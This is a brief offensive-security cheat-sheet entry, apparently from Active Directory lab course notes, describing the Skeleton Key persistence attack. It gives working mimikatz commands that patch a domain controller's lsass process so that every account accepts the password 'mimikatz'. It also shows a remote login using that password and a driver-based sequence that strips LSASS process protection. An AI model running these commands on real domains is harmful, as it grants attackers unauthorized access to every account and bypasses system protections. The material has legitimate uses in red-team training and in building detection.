## **Skeleton Key**

Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
All the publicly known methods are NOT persistent across reboots

Use the below command to inject a skeleton key(password would be mimikatz) on a Domain Controller of choice. DA privileges required
- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp- dc.dollarcorp.moneycorp.local

Now, it is possible to access any machine with a valid username and password as "mimikatz"
- Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator

You can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted.

In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
- mimikatz # privilege::debug
- mimikatz # !+
- mimikatz # !processprotect /process:lsass.exe /remove mimikatz # misc::skeleton
- mimikatz # !-

Note that above would be very noisy in logs - Service installation (Kernel mode driver)
